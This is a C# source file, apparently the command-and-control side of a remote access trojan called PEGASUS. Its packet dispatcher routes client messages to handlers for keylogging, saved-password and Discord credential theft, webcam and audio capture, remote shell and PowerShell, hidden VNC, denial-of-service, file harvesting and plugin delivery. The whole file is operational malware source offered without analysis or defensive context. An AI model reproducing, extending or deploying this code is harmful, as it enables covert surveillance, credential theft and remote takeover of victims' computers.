﻿namespace PEGASUS.BytesInOut
{
    using PEGASUS.Diadyktio;
    using PEGASUS.Metafora_Dedomenon;
    using System;
    using System.Drawing;
    using System.Threading;
    using System.Windows.Forms;

    /// <summary>
    /// Defines the <see cref="Packet" />.
    /// </summary>
    public class Packet
    {
        /// <summary>
        /// Defines the client.
        /// </summary>
        public Clients client;

        /// <summary>
        /// Defines the data.
        /// </summary>
        public byte[] data;

        /// <summary>
        /// The Read.
        /// </summary>
        /// <param name="o">The o<see cref="object"/>.</param>
        public void Read(object o)
        {
            try
            {
                var unpack_msgpack = new MsgPack();
                unpack_msgpack.DecodeFromBytes(data);
                Program.form1.Invoke((MethodInvoker)(() =>
               {
                   switch (unpack_msgpack.ForcePathObject("Pac_ket").AsString)
                   {
                       case "ClientInfo":
                           {
                               ThreadPool.QueueUserWorkItem(delegate
                                {
                                    new HandleListView().AddToListview(client, unpack_msgpack);
                                });
                               break;
                           }

                       case "Ping":
                           {
                               new HandlePing().Ping(client, unpack_msgpack);
                               client.LastPing = DateTime.Now;
                               break;
                           }

                       case "Po_ng":
                           {
                               new HandlePing().Po_ng(client, unpack_msgpack);
                               client.LastPing = DateTime.Now;
                               break;
                           }

                       case "Logs":
                           {
                               new HandleLogs().Addmsg(
                                    $"From {client.Ip} client: {unpack_msgpack.ForcePathObject("Message").AsString}",
                                    Color.FromArgb(3, 130, 200));
                               break;
                           }

                       case "thumbnails":
                           {
                               client.ID = unpack_msgpack.ForcePathObject("Hwid").AsString;
                               new HandleThumbnails(client, unpack_msgpack);
                               break;
                           }

                       case "Received":
                           {
                               new HandleListView().Received(client);
                               client.LastPing = DateTime.Now;
                               break;
                           }

                       case "Error":
                           {
                               new HandleLogs().Addmsg(
                                    $"Error from {client.Ip} client: {unpack_msgpack.ForcePathObject("Error").AsString}",
                                    Color.Red);
                               /*lock (Settings.LockListviewClients)
                               {
                                   client.LV.ForeColor = Color.Empty;
                               }*/
                               break;
                           }
                       case "remoteDesktop":
                           {
                               new HandleRemoteDesktop().Capture(client, unpack_msgpack);
                               break;
                           }

                       case "processManager":
                           {
                               new HandleProcessManager().GetProcess(client, unpack_msgpack);
                               break;
                           }

                       case "netstat":
                           {
                               new HandleNetstat().GetProcess(client, unpack_msgpack);
                               break;
                           }

                       case "socketDownload":
                           {
                               new HandleFileManager().SocketDownload(client, unpack_msgpack);
                               break;
                           }

                       case "keyLogger":
                           {
                               new HandleKeylogger(client, unpack_msgpack);
                               break;
                           }

                       case "fileManager":
                           {
                               new HandleFileManager().FileManager(client, unpack_msgpack);
                               break;
                           }

                       case "shell":
                           {
                               new HandleShell(unpack_msgpack, client);
                               break;
                           }

                       case "powershell":
                           {
                               new HandlePowerShell(unpack_msgpack, client);
                               break;
                           }

                       case "chat":
                           {
                               new HandleChat().Read(unpack_msgpack, client);
                               break;
                           }

                       case "chat-":
                           {
                               new HandleChat().GetClient(unpack_msgpack, client);
                               break;
                           }

                       case "reportWindow":
                           {
                               new HandleReportWindow(client, unpack_msgpack.ForcePathObject("Report").AsString);
                               break;
                           }

                       case "reportWindow-":
                           {
                               if (Settings.ReportWindow == false)
                               {
                                   var packet = new MsgPack();
                                   packet.ForcePathObject("Pac_ket").AsString = "reportWindow";
                                   packet.ForcePathObject("Option").AsString = "stop";
                                   ThreadPool.QueueUserWorkItem(client.Send, packet.Encode2Bytes());
                                   return;
                               }

                               lock (Settings.LockReportWindowClients)
                               {
                                   Settings.ReportWindowClients.Add(client);
                               }

                               break;
                           }

                       case "webcam":
                           {
                               new HandleWebcam(unpack_msgpack, client);
                               break;
                           }

                       case "dosAdd":
                           {
                               new HandleDos().Add(client, unpack_msgpack);
                               break;
                           }

                       case "sendPlugin":
                           {
                               new HandleLogs().Addmsg($"Activating plugin to {client.Ip} ……", Color.Red);
                               ThreadPool.QueueUserWorkItem(delegate
                                {
                                    client.SendPlugin(unpack_msgpack.ForcePathObject("Hashes").AsString);
                                });
                               break;
                           }

                       case "fileSearcher":
                           {
                               new HandleFileSearcher().SaveZipFile(client, unpack_msgpack);
                               break;
                           }
                       case "Information":
                           {
                               new HandleInformation().AddToInformationList(client, unpack_msgpack);
                               break;
                           }
                       case "Password":
                           {
                               new HandlePassword().SavePassword(client, unpack_msgpack);
                               break;
                           }
                       case "Audio":
                           {
                               new HandleAudio().SaveAudio(client, unpack_msgpack);
                               break;
                           }
                       case "recoveryPassword":
                           {
                               new HandleRecovery(client, unpack_msgpack);
                               break;
                           }
                       case "discordRecovery":
                           {
                               new HandleDiscordRecovery(client, unpack_msgpack);
                               break;
                           }
                       case "regManager":
                           {
                               new HandleRegManager().RegManager(client, unpack_msgpack);
                               break;
                           }

                       case "fun":
                           {
                               new HandleFun().Fun(client, unpack_msgpack);
                               break;
                           }

                       case "Login":
                           {
                               new HandlehRDP().handlehRDP(client, unpack_msgpack);
                               break;
                           }

                       case "KATANA":
                           {
                               new HandleKATANA(client, unpack_msgpack);
                               break;
                           }
                       case "HVNC":
                           {
                               new HandleHVNC(client, unpack_msgpack);
                               break;
                           }
                   }
               }));
            }
            catch
            {
            }
        }
    }
}
